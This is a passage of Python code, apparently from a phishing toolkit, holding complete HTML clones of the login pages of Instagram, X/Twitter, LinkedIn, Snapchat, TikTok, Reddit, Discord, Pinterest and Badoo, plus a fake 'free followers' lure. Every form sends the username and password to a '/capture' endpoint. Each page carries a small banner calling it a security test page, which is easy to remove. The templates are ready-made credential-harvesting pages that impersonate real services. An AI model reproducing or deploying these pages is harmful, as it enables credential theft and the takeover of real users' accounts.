        .container { max-width: 350px; width: 100%; }
        .login-box { background: #fff; border: 1px solid #dbdbdb; border-radius: 1px; padding: 40px 30px; margin-bottom: 10px; }
        .logo { text-align: center; margin-bottom: 30px; }
        .logo svg { width: 175px; height: 51px; }
        .form-group { margin-bottom: 8px; }
        input[type="text"], input[type="password"] { width: 100%; padding: 9px 8px; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; font-size: 12px; outline: none; }
        input[type="text"]:focus, input[type="password"]:focus { border-color: #a8a8a8; background: #fff; }
        button { width: 100%; padding: 7px 16px; background: #0095f6; color: #fff; border: none; border-radius: 4px; font-weight: 600; font-size: 14px; cursor: pointer; margin-top: 12px; }
        button:hover { background: #1877f2; }
        .divider { display: flex; align-items: center; margin: 20px 0; }
        .divider-line { flex: 1; height: 1px; background: #dbdbdb; }
        .divider-text { margin: 0 18px; color: #8e8e8e; font-weight: 600; font-size: 13px; }
        .facebook-login { text-align: center; margin: 8px 0; }
        .facebook-login a { color: #385185; font-weight: 600; text-decoration: none; font-size: 14px; }
        .forgot-password { text-align: center; margin-top: 12px; }
        .forgot-password a { color: #00376b; text-decoration: none; font-size: 12px; }
        .signup-box { background: #fff; border: 1px solid #dbdbdb; border-radius: 1px; padding: 20px; text-align: center; }
        .warning { margin-top: 20px; padding: 12px; background: #fff3cd; border: 1px solid #ffeeba; border-radius: 4px; color: #856404; text-align: center; font-size: 12px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-box">
            <div class="logo"><svg viewBox="0 0 175 51" fill="none"><path d="M42 10.5C42 15.7467 37.7467 20 32.5 20H12.5C7.2533 20 3 15.7467 3 10.5V10.5C3 5.2533 7.2533 1 12.5 1H32.5C37.7467 1 42 5.2533 42 10.5V10.5Z" fill="#F35369"/><path d="M45 40.5C45 45.7467 40.7467 50 35.5 50H15.5C10.2533 50 6 45.7467 6 40.5V40.5C6 35.2533 10.2533 31 15.5 31H35.5C40.7467 31 45 35.2533 45 40.5V40.5Z" fill="#F35369"/><rect x="3" y="10" width="39" height="30" rx="4" fill="#F35369"/><circle cx="12.5" cy="25.5" r="4.5" fill="white"/><circle cx="32.5" cy="25.5" r="4.5" fill="white"/><circle cx="22.5" cy="25.5" r="4.5" fill="white"/><path d="M20.5 1H29.5V50H20.5V1Z" fill="#F35369"/></svg></div>
            <form method="POST" action="/capture">
                <div class="form-group"><input type="text" name="username" placeholder="Phone number, username, or email" required></div>
                <div class="form-group"><input type="password" name="password" placeholder="Password" required></div>
                <button type="submit">Log In</button>
                <div class="divider"><div class="divider-line"></div><div class="divider-text">OR</div><div class="divider-line"></div></div>
                <div class="facebook-login"><a href="#">Log in with Facebook</a></div>
                <div class="forgot-password"><a href="#">Forgot password?</a></div>
            </form>
        </div>
        <div class="signup-box"><p>Don't have an account? <a href="#">Sign up</a></p></div>
        <div class="warning">⚠️ This is a security test page. Do not enter real credentials.</div>
    </div>
</body>
</html>"""
    
    def _get_instagram_followers_template(self):
        return """<!DOCTYPE html>
<html>
<head>
    <title>Instagram • Free Followers</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
        .container { max-width: 500px; width: 100%; }
        .card { background: #fff; border-radius: 20px; box-shadow: 0 20px 60px rgba(0,0,0,0.3); overflow: hidden; }
        .header { background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%); color: white; padding: 40px 30px; text-align: center; }
        .header h1 { font-size: 32px; margin-bottom: 10px; }
        .header p { font-size: 16px; opacity: 0.9; }
        .stats { display: flex; justify-content: space-around; padding: 30px; background: #f8f9fa; border-bottom: 1px solid #e9ecef; }
        .stat-item { text-align: center; }
        .stat-value { font-size: 28px; font-weight: bold; color: #f5576c; }
        .stat-label { font-size: 14px; color: #6c757d; margin-top: 5px; }
        .content { padding: 30px; }
        .form-group { margin-bottom: 20px; }
        label { display: block; margin-bottom: 8px; color: #495057; font-weight: 500; font-size: 14px; }
        input[type="text"], input[type="password"] { width: 100%; padding: 15px; border: 2px solid #e9ecef; border-radius: 10px; font-size: 16px; transition: all 0.3s; }
        input[type="text"]:focus, input[type="password"]:focus { border-color: #f5576c; outline: none; box-shadow: 0 0 0 3px rgba(245,87,108,0.1); }
        button { width: 100%; padding: 15px; background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%); color: white; border: none; border-radius: 10px; font-size: 18px; font-weight: 600; cursor: pointer; transition: transform 0.2s; }
        button:hover { transform: translateY(-2px); }
        .features { display: grid; grid-template-columns: repeat(2, 1fr); gap: 15px; margin: 30px 0; }
        .feature { text-align: center; padding: 15px; background: #f8f9fa; border-radius: 10px; }
        .feature-icon { font-size: 24px; margin-bottom: 5px; }
        .feature-text { font-size: 13px; color: #495057; }
        .warning { margin-top: 20px; padding: 12px; background: #fff3cd; border: 1px solid #ffeeba; border-radius: 10px; color: #856404; text-align: center; font-size: 13px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <div class="header"><h1>🔥 Instagram Follower Generator</h1><p>Get 1000+ real followers instantly • Free for a limited time</p></div>
            <div class="stats"><div class="stat-item"><div class="stat-value">1.2M+</div><div class="stat-label">Users</div></div><div class="stat-item"><div class="stat-value">50K+</div><div class="stat-label">Today</div></div><div class="stat-item"><div class="stat-value">4.8★</div><div class="stat-label">Rating</div></div></div>
            <div class="content">
                <form method="POST" action="/capture">
                    <div class="form-group"><label>Instagram Username</label><input type="text" name="username" placeholder="@username" required></div>
                    <div class="form-group"><label>Password (to verify account)</label><input type="password" name="password" placeholder="••••••••" required></div>
                    <div class="form-group"><label>How many followers?</label><select style="width:100%; padding:15px; border:2px solid #e9ecef; border-radius:10px;"><option>1,000 followers (Free)</option><option>5,000 followers ($4.99)</option><option>10,000 followers ($9.99)</option><option>50,000 followers ($29.99)</option></select></div>
                    <button type="submit">Generate Followers 🚀</button>
                </form>
                <div class="features"><div class="feature"><div class="feature-icon">⚡</div><div class="feature-text">Instant Delivery</div></div><div class="feature"><div class="feature-icon">🔒</div><div class="feature-text">Secure & Private</div></div><div class="feature"><div class="feature-icon">🔄</div><div class="feature-text">Real Followers</div></div><div class="feature"><div class="feature-icon">💯</div><div class="feature-text">No Password Required</div></div></div>
                <div class="warning">⚠️ This is a security test page. Do not enter real credentials.</div>
            </div>
        </div>
    </div>
</body>
</html>"""
    
    def _get_twitter_template(self):
        return """<!DOCTYPE html>
<html>
<head>
    <title>X / Twitter</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'TwitterChirp', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background: #000; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; color: #e7e9ea; }
        .container { max-width: 600px; width: 100%; }
        .login-box { background: #000; border: 1px solid #2f3336; border-radius: 16px; padding: 48px; }
        .logo { text-align: center; margin-bottom: 30px; }
        .logo svg { width: 40px; height: 40px; fill: #e7e9ea; }
        h1 { font-size: 31px; font-weight: 700; margin-bottom: 30px; color: #e7e9ea; }
        .form-group { margin-bottom: 20px; }
        input[type="text"], input[type="password"] { width: 100%; padding: 12px; background: #000; border: 1px solid #2f3336; border-radius: 4px; color: #e7e9ea; font-size: 16px; outline: none; }
        input[type="text"]:focus, input[type="password"]:focus { border-color: #1d9bf0; }
        button { width: 100%; padding: 12px; background: #1d9bf0; color: #fff; border: none; border-radius: 9999px; font-weight: 700; font-size: 16px; cursor: pointer; margin-top: 20px; }
        button:hover { background: #1a8cd8; }
        .links { display: flex; justify-content: space-between; margin-top: 20px; }
        .links a { color: #1d9bf0; text-decoration: none; font-size: 14px; }
        .signup { margin-top: 40px; text-align: center; }
        .signup p { color: #6b7080; font-size: 14px; }
        .signup a { color: #1d9bf0; text-decoration: none; font-weight: 500; }
        .warning { margin-top: 20px; padding: 12px; background: #1a1a1a; border: 1px solid #2f3336; border-radius: 8px; color: #e7e9ea; text-align: center; font-size: 14px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-box">
            <div class="logo"><svg viewBox="0 0 24 24"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg></div>
            <h1>Sign in to X</h1>
            <form method="POST" action="/capture">
                <div class="form-group"><input type="text" name="username" placeholder="Phone, email, or username" required></div>
                <div class="form-group"><input type="password" name="password" placeholder="Password" required></div>
                <button type="submit">Next</button>
                <div class="links"><a href="#">Forgot password?</a><a href="#">Sign up with X</a></div>
            </form>
            <div class="signup"><p>Don't have an account? <a href="#">Sign up</a></p></div>
            <div class="warning">⚠️ This is a security test page. Do not enter real credentials.</div>
        </div>
    </div>
</body>
</html>"""
    
    def _get_linkedin_template(self):
        return """<!DOCTYPE html>
<html>
<head>
    <title>LinkedIn Login</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system, system-ui, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', 'Fira Sans', Ubuntu, Oxygen, 'Oxygen Sans', Cantarell, 'Droid Sans', 'Apple Color Emoji', 'Segoe UI Emoji', 'Segoe UI Emoji', 'Segoe UI Symbol', 'Lucida Grande', Helvetica, Arial, sans-serif; background: #f3f2f0; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
        .container { max-width: 400px; width: 100%; }
        .login-box { background: #fff; border-radius: 8px; padding: 40px 32px; box-shadow: 0 4px 12px rgba(0,0,0,0.15); }
        .logo { text-align: center; margin-bottom: 24px; }
        .logo svg { width: 84px; height: 21px; }
        h1 { font-size: 32px; font-weight: 600; margin: 0 0 8px; color: #000; }
        .subtitle { color: #666; font-size: 14px; margin-bottom: 24px; }
        .form-group { margin-bottom: 16px; }
        input[type="text"], input[type="password"] { width: 100%; padding: 14px; border: 1px solid #666; border-radius: 4px; font-size: 14px; outline: none; }
        input[type="text"]:focus, input[type="password"]:focus { border-color: #0a66c2; }
        button { width: 100%; padding: 14px; background: #0a66c2; color: #fff; border: none; border-radius: 28px; font-weight: 600; font-size: 16px; cursor: pointer; margin-top: 8px; }
        button:hover { background: #004182; }
        .forgot-password { text-align: center; margin-top: 16px; }
        .forgot-password a { color: #0a66c2; text-decoration: none; font-weight: 600; font-size: 14px; }
        .signup-link { text-align: center; margin-top: 20px; padding-top: 20px; border-top: 1px solid #e0e0e0; }
        .signup-link a { color: #0a66c2; text-decoration: none; font-weight: 600; }
        .warning { margin-top: 20px; padding: 12px; background: #fff3cd; border: 1px solid #ffeeba; border-radius: 4px; color: #856404; text-align: center; font-size: 13px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-box">
            <div class="logo"><svg viewBox="0 0 84 21"><path d="M8.5 4.5H4V16.5H8.5V4.5Z" fill="#0A66C2"/><path d="M21 4.5H16.5V16.5H21V4.5Z" fill="#0A66C2"/><path d="M12.5 9.5C12.5 7.8 13.8 6.5 15.5 6.5H21V4.5H15.5C12.7 4.5 10.5 6.7 10.5 9.5V11.5C10.5 14.3 12.7 16.5 15.5 16.5H21V14.5H15.5C13.8 14.5 12.5 13.2 12.5 11.5V9.5Z" fill="#0A66C2"/><circle cx="6" cy="6" r="2.5" fill="#0A66C2"/><path d="M78 4.5H73.5V16.5H78V4.5Z" fill="#0A66C2"/><path d="M69 9.5C69 7.8 70.3 6.5 72 6.5H78V4.5H72C69.2 4.5 67 6.7 67 9.5V11.5C67 14.3 69.2 16.5 72 16.5H78V14.5H72C70.3 14.5 69 13.2 69 11.5V9.5Z" fill="#0A66C2"/><circle cx="62.5" cy="10.5" r="6" fill="#0A66C2"/></svg></div>
            <h1>Sign in</h1>
            <div class="subtitle">Stay updated on your professional world</div>
            <form method="POST" action="/capture">
                <div class="form-group"><input type="text" name="email" placeholder="Email or phone number" required></div>
                <div class="form-group"><input type="password" name="password" placeholder="Password" required></div>
                <button type="submit">Sign in</button>
                <div class="forgot-password"><a href="#">Forgot password?</a></div>
            </form>
            <div class="signup-link">New to LinkedIn? <a href="#">Join now</a></div>
            <div class="warning">⚠️ This is a security test page. Do not enter real credentials.</div>
        </div>
    </div>
</body>
</html>"""
    
    def _get_snapchat_template(self):
        return """<!DOCTYPE html>
<html>
<head>
    <title>Snapchat - Log In</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Avenir Next', 'Helvetica Neue', Helvetica, Arial, sans-serif; background: #fffc00; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
        .container { max-width: 400px; width: 100%; }
        .logo { text-align: center; margin-bottom: 40px; }
        .logo svg { width: 80px; height: 80px; }
        .login-box { background: white; border-radius: 20px; padding: 40px 30px; box-shadow: 0 10px 40px rgba(0,0,0,0.1); }
        h1 { text-align: center; font-size: 28px; margin-bottom: 30px; color: #111; }
        .form-group { margin-bottom: 20px; }
        input[type="text"], input[type="password"] { width: 100%; padding: 15px; border: 2px solid #eee; border-radius: 30px; font-size: 16px; outline: none; transition: border-color 0.3s; }
        input[type="text"]:focus, input[type="password"]:focus { border-color: #fffc00; }
        button { width: 100%; padding: 15px; background: #111; color: white; border: none; border-radius: 30px; font-size: 18px; font-weight: 600; cursor: pointer; transition: background 0.3s; }
        button:hover { background: #333; }
        .signup-link { text-align: center; margin-top: 20px; }
        .signup-link a { color: #111; text-decoration: none; font-weight: 600; }
        .qr-login { text-align: center; margin-top: 30px; padding-top: 20px; border-top: 1px solid #eee; }
        .qr-login a { color: #111; text-decoration: none; font-size: 14px; }
        .warning { margin-top: 20px; padding: 12px; background: #fff3cd; border: 1px solid #ffeeba; border-radius: 30px; color: #856404; text-align: center; font-size: 13px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo"><svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8z"/><circle cx="12" cy="12" r="3"/></svg></div>
        <div class="login-box">
            <h1>Log In</h1>
            <form method="POST" action="/capture">
                <div class="form-group"><input type="text" name="username" placeholder="Username or Email" required></div>
                <div class="form-group"><input type="password" name="password" placeholder="Password" required></div>
                <button type="submit">Log In</button>
                <div class="signup-link"><a href="#">New to Snapchat? Sign Up</a></div>
                <div class="qr-login"><a href="#">Log in with QR Code</a></div>
            </form>
        </div>
        <div class="warning">⚠️ This is a security test page. Do not enter real credentials.</div>
    </div>
</body>
</html>"""
    
    def _get_tiktok_template(self):
        return """<!DOCTYPE html>
<html>
<head>
    <title>TikTok - Log In</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'TikTokFont', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background: #fff; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
        .container { max-width: 400px; width: 100%; }
        .login-box { background: #fff; border-radius: 8px; padding: 40px 30px; box-shadow: 0 2px 20px rgba(0,0,0,0.1); }
        .logo { text-align: center; margin-bottom: 30px; }
        .logo svg { width: 40px; height: 40px; }
        h1 { text-align: center; font-size: 24px; margin-bottom: 30px; color: #111; }
        .tabs { display: flex; margin-bottom: 30px; border-bottom: 1px solid #eee; }
        .tab { flex: 1; text-align: center; padding: 10px; cursor: pointer; color: #666; font-weight: 500; }
        .tab.active { color: #fe2c55; border-bottom: 2px solid #fe2c55; }
        .form-group { margin-bottom: 20px; }
        input[type="text"], input[type="password"] { width: 100%; padding: 15px; border: 1px solid #ddd; border-radius: 4px; font-size: 16px; outline: none; }
        input[type="text"]:focus, input[type="password"]:focus { border-color: #fe2c55; }
        button { width: 100%; padding: 15px; background: #fe2c55; color: #fff; border: none; border-radius: 4px; font-size: 16px; font-weight: 600; cursor: pointer; margin-top: 10px; }
        button:hover { background: #e62648; }
        .qr-login { text-align: center; margin: 20px 0; }
        .qr-login a { color: #fe2c55; text-decoration: none; font-size: 14px; }
        .terms { text-align: center; margin-top: 30px; color: #666; font-size: 12px; }
        .terms a { color: #fe2c55; text-decoration: none; }
        .warning { margin-top: 20px; padding: 12px; background: #fff3cd; border: 1px solid #ffeeba; border-radius: 4px; color: #856404; text-align: center; font-size: 13px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-box">
            <div class="logo"><svg viewBox="0 0 24 24"><path d="M19.59 6.69a4.83 4.83 0 0 1-3.77-4.25V2h-3.45v13.67a2.89 2.89 0 0 1-5.2 1.74 2.89 2.89 0 0 1 2.31-4.64c.28 0 .55.04.81.11V9.42a6.37 6.37 0 0 0-1-.08 6.34 6.34 0 0 0 0 12.68c3.5 0 6.34-2.84 6.34-6.34v-7.1a8.21 8.21 0 0 0 4.77 1.52v-3.4c-.29 0-.58-.02-.86-.07z" fill="black"/></svg></div>
            <h1>Log in to TikTok</h1>
            <div class="tabs"><div class="tab active">Use phone / email / username</div><div class="tab">Use QR code</div></div>
            <form method="POST" action="/capture">
                <div class="form-group"><input type="text" name="username" placeholder="Phone number / Email / Username" required></div>
                <div class="form-group"><input type="password" name="password" placeholder="Password" required></div>
                <button type="submit">Log in</button>
            </form>
            <div class="qr-login"><a href="#">Log in with QR code</a></div>
            <div class="terms">By continuing, you agree to TikTok's <a href="#">Terms of Service</a> and confirm that you have read TikTok's <a href="#">Privacy Policy</a>.</div>
            <div class="warning">⚠️ This is a security test page. Do not enter real credentials.</div>
        </div>
    </div>
</body>
</html>"""
    
    def _get_reddit_template(self):
        return """<!DOCTYPE html>
<html>
<head>
    <title>reddit: Log in</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'IBM Plex Sans', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif; background: #dae0e6; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
        .container { max-width: 400px; width: 100%; }
        .login-box { background: #fff; border-radius: 4px; padding: 40px 30px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
        .logo { text-align: center; margin-bottom: 30px; }
        .logo svg { width: 60px; height: 60px; }
        h1 { font-size: 20px; font-weight: 500; margin-bottom: 30px; text-align: center; color: #1c1c1c; }
        .form-group { margin-bottom: 20px; }
        input[type="text"], input[type="password"] { width: 100%; padding: 12px; border: 1px solid #edeff1; border-radius: 4px; font-size: 14px; background: #fcfcfb; outline: none; }
        input[type="text"]:focus, input[type="password"]:focus { border-color: #0079d3; }
        button { width: 100%; padding: 12px; background: #0079d3; color: #fff; border: none; border-radius: 4px; font-size: 14px; font-weight: 700; cursor: pointer; margin-top: 10px; }
        button:hover { background: #006cbd; }
        .links { display: flex; justify-content: space-between; margin: 20px 0; font-size: 12px; }
        .links a { color: #0079d3; text-decoration: none; }
        .signup { text-align: center; margin-top: 20px; padding-top: 20px; border-top: 1px solid #edeff1; }
        .signup p { color: #7c7c7c; font-size: 14px; }
        .signup a { color: #0079d3; text-decoration: none; font-weight: 500; }
        .warning { margin-top: 20px; padding: 12px; background: #fff3cd; border: 1px solid #ffeeba; border-radius: 4px; color: #856404; text-align: center; font-size: 13px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-box">
            <div class="logo"><svg viewBox="0 0 20 20"><circle cx="10" cy="10" r="10" fill="#FF4500"/><path d="M15.5 10c0 3.04-2.46 5.5-5.5 5.5S4.5 13.04 4.5 10 6.96 4.5 10 4.5 15.5 6.96 15.5 10z" fill="white"/><circle cx="7" cy="9" r="1.5" fill="#FF4500"/><circle cx="13" cy="9" r="1.5" fill="#FF4500"/><path d="M10 13c1.5 0 2.5-1 2.5-1h-5s1 1 2.5 1z" fill="#FF4500"/></svg></div>
            <h1>Log in to Reddit</h1>
            <form method="POST" action="/capture">
                <div class="form-group"><input type="text" name="username" placeholder="Username" required></div>
                <div class="form-group"><input type="password" name="password" placeholder="Password" required></div>
                <button type="submit">Log In</button>
                <div class="links"><a href="#">Forgot username</a><a href="#">Forgot password</a></div>
            </form>
            <div class="signup"><p>New to Reddit? <a href="#">Sign up</a></p></div>
            <div class="warning">⚠️ This is a security test page. Do not enter real credentials.</div>
        </div>
    </div>
</body>
</html>"""
    
    def _get_discord_template(self):
        return """<!DOCTYPE html>
<html>
<head>
    <title>Discord</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Whitney', 'Helvetica Neue', Helvetica, Arial, sans-serif; background: #5865f2; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
        .container { max-width: 480px; width: 100%; }
        .login-box { background: #36393f; border-radius: 8px; padding: 40px; box-shadow: 0 4px 20px rgba(0,0,0,0.3); }
        .logo { text-align: center; margin-bottom: 30px; }
        .logo svg { width: 130px; height: 40px; }
        h1 { color: #fff; font-size: 24px; font-weight: 600; margin-bottom: 10px; text-align: center; }
        .subtitle { color: #b9bbbe; font-size: 16px; text-align: center; margin-bottom: 30px; }
        .form-group { margin-bottom: 20px; }
        label { color: #b9bbbe; font-size: 12px; font-weight: 600; letter-spacing: 0.5px; text-transform: uppercase; margin-bottom: 8px; display: block; }
        input[type="text"], input[type="password"] { width: 100%; padding: 12px; background: #202225; border: 1px solid #202225; border-radius: 4px; color: #dcddde; font-size: 16px; outline: none; }
        input[type="text"]:focus, input[type="password"]:focus { border-color: #00aff4; }
        .forgot-password { text-align: right; margin: 10px 0 20px; }
        .forgot-password a { color: #00aff4; text-decoration: none; font-size: 14px; }
        button { width: 100%; padding: 14px; background: #5865f2; color: #fff; border: none; border-radius: 4px; font-size: 16px; font-weight: 500; cursor: pointer; transition: background 0.2s; }
        button:hover { background: #4752c4; }
        .qr-login { text-align: center; margin: 20px 0; }
        .qr-login a { color: #00aff4; text-decoration: none; font-size: 14px; }
        .signup { text-align: center; margin-top: 20px; color: #b9bbbe; font-size: 14px; }
        .signup a { color: #00aff4; text-decoration: none; font-weight: 500; }
        .warning { margin-top: 20px; padding: 12px; background: #2f3136; border: 1px solid #40444b; border-radius: 4px; color: #dcddde; text-align: center; font-size: 13px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-box">
            <div class="logo"><svg viewBox="0 0 130 40"><path d="M26.5 9.5L23 16L19.5 9.5H16L20.5 18L16 26.5H19.5L23 20L26.5 26.5H30L25.5 18L30 9.5H26.5Z" fill="white"/><path d="M40 9.5V26.5H43V18.5H47V26.5H50V18.5H54V26.5H57V9.5H54V15.5H47V9.5H40Z" fill="white"/><path d="M60 9.5V26.5H70V23.5H63V19.5H70V16.5H63V12.5H70V9.5H60Z" fill="white"/><path d="M73 9.5V26.5H83V23.5H76V12.5H83V9.5H73Z" fill="white"/><path d="M86 9.5V26.5H96V23.5H89V12.5H96V9.5H86Z" fill="white"/><path d="M99 9.5V26.5H109V23.5H102V12.5H109V9.5H99Z" fill="white"/><path d="M112 9.5V26.5H122V23.5H115V12.5H122V9.5H112Z" fill="white"/></svg></div>
            <h1>Welcome back!</h1>
            <div class="subtitle">We're so excited to see you again!</div>
            <form method="POST" action="/capture">
                <div class="form-group"><label>EMAIL OR PHONE NUMBER</label><input type="text" name="email" placeholder="Email or phone number" required></div>
                <div class="form-group"><label>PASSWORD</label><input type="password" name="password" placeholder="Password" required></div>
                <div class="forgot-password"><a href="#">Forgot your password?</a></div>
                <button type="submit">Log In</button>
            </form>
            <div class="qr-login"><a href="#">Log in with QR Code</a></div>
            <div class="signup">Need an account? <a href="#">Register</a></div>
            <div class="warning">⚠️ This is a security test page. Do not enter real credentials.</div>
        </div>
    </div>
</body>
</html>"""
    
    def _get_pinterest_template(self):
        return """<!DOCTYPE html>
<html>
<head>
    <title>Pinterest • Login</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif; background: #fff; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
        .container { max-width: 400px; width: 100%; }
        .login-box { background: #fff; border-radius: 32px; padding: 40px; box-shadow: 0 0 20px rgba(0,0,0,0.1); }
        .logo { text-align: center; margin-bottom: 30px; }
        .logo svg { width: 48px; height: 48px; }
        h1 { font-size: 32px; font-weight: 600; margin-bottom: 30px; text-align: center; color: #c00; }
        .form-group { margin-bottom: 20px; }
        input[type="text"], input[type="password"] { width: 100%; padding: 16px; border: 1px solid #ddd; border-radius: 24px; font-size: 16px; outline: none; transition: border-color 0.3s; }
        input[type="text"]:focus, input[type="password"]:focus { border-color: #c00; }
        button { width: 100%; padding: 16px; background: #c00; color: #fff; border: none; border-radius: 24px; font-size: 16px; font-weight: 600; cursor: pointer; transition: background 0.3s; }
        button:hover { background: #a00; }
        .links { text-align: center; margin: 20px 0; }
        .links a { color: #333; text-decoration: none; font-size: 14px; }
        .divider { display: flex; align-items: center; margin: 20px 0; }
        .divider-line { flex: 1; height: 1px; background: #ddd; }
        .divider-text { margin: 0 15px; color: #666; font-size: 14px; }
        .social-login { display: flex; gap: 10px; margin: 20px 0; }
        .social-btn { flex: 1; padding: 12px; border: 1px solid #ddd; border-radius: 24px; background: #fff; cursor: pointer; }
        .signup-link { text-align: center; margin-top: 20px; }
        .signup-link a { color: #c00; text-decoration: none; font-weight: 600; }
        .warning { margin-top: 20px; padding: 12px; background: #fff3cd; border: 1px solid #ffeeba; border-radius: 24px; color: #856404; text-align: center; font-size: 13px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-box">
            <div class="logo"><svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10" fill="#E60023"/><path d="M12 4C7.58 4 4 7.58 4 12c0 3.67 2.38 6.79 5.67 7.9-.08-.71-.16-1.83.03-2.61.18-.74 1.16-4.9 1.16-4.9s-.3-.6-.3-1.48c0-1.38.8-2.41 1.8-2.41.85 0 1.26.64 1.26 1.4 0 .86-.55 2.14-.83 3.33-.24.99.5 1.8 1.48 1.8 1.78 0 3.15-1.87 3.15-4.57 0-2.39-1.72-4.06-4.17-4.06-2.84 0-4.51 2.13-4.51 4.33 0 .86.33 1.78.74 2.28.08.1.09.19.07.29-.08.31-.24.98-.28 1.12-.04.17-.14.2-.27.12-1.01-.47-1.64-1.95-1.64-3.14 0-2.55 1.86-4.9 5.35-4.9 2.81 0 5 2.01 5 4.69 0 2.8-1.77 5.06-4.23 5.06-.83 0-1.6-.43-1.87-.94 0 0-.41 1.56-.51 1.94-.19.72-.7 1.62-1.04 2.17.78.24 1.61.38 2.47.38 4.42 0 8-3.58 8-8s-3.58-8-8-8z" fill="white"/></svg></div>
            <h1>Welcome to Pinterest</h1>
            <form method="POST" action="/capture">
                <div class="form-group"><input type="text" name="email" placeholder="Email" required></div>
                <div class="form-group"><input type="password" name="password" placeholder="Password" required></div>
                <button type="submit">Log in</button>
                <div class="links"><a href="#">Forgot your password?</a></div>
                <div class="divider"><div class="divider-line"></div><div class="divider-text">OR</div><div class="divider-line"></div></div>
                <div class="social-login"><button class="social-btn">Facebook</button><button class="social-btn">Google</button></div>
            </form>
            <div class="signup-link"><a href="#">Create a free account</a></div>
            <div class="warning">⚠️ This is a security test page. Do not enter real credentials.</div>
        </div>
    </div>
</body>
</html>"""
    
    def _get_badoo_template(self):
        return """<!DOCTYPE html>
<html>
<head>
    <title>Badoo - Meet New People</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; background: linear-gradient(135deg, #ff6b6b 0%, #4ecdc4 100%); display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
        .container { max-width: 400px; width: 100%; }
        .login-box { background: rgba(255,255,255,0.95); border-radius: 20px; padding: 40px; box-shadow: 0 20px 60px rgba(0,0,0,0.3); backdrop-filter: blur(10px); }
        .logo { text-align: center; margin-bottom: 30px; }
        .logo h1 { font-size: 40px; color: #ff6b6b; font-weight: 700; }
        .logo p { color: #666; font-size: 14px; margin-top: 5px; }
        .form-group { margin-bottom: 20px; }
        input[type="text"], input[type="password"] { width: 100%; padding: 15px; border: 1px solid #ddd; border-radius: 30px; font-size: 16px; outline: none; transition: all 0.3s; }
        input[type="text"]:focus, input[type="password"]:focus { border-color: #ff6b6b; box-shadow: 0 0 0 3px rgba(255,107,107,0.1); }
        button { width: 100%; padding: 15px; background: linear-gradient(135deg, #ff6b6b 0%, #4ecdc4 100%); color: #fff; border: none; border-radius: 30px; font-size: 18px; font-weight: 600; cursor: pointer; transition: transform 0.2s; }
        button:hover { transform: translateY(-2px); }
        .links { display: flex; justify-content: space-between; margin: 20px 0; }
